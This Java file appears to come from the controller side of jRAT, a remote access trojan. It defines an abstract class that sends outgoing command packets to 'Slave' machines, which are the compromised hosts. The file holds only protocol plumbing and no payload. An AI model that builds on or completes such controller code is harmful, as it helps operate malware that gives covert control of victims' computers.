package io.jrat.controller.packets.outgoing;

import io.jrat.common.PacketRange;
import io.jrat.controller.Slave;
import io.jrat.controller.addons.PluginEventHandler;
import java.io.DataOutputStream;


public abstract class AbstractOutgoingPacket {

	public abstract void write(Slave slave, DataOutputStream dos) throws Exception;

	public abstract short getPacketId();

	public synchronized final void send(Slave slave, DataOutputStream dos) {
		try {
			short id = getPacketId();

			if (id < 0 || id > PacketRange.RANGE_OUTGOING) {
				PluginEventHandler.onSendPacket(id, slave);
			}

			dos.writeShort(getPacketId());
			this.write(slave, dos);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
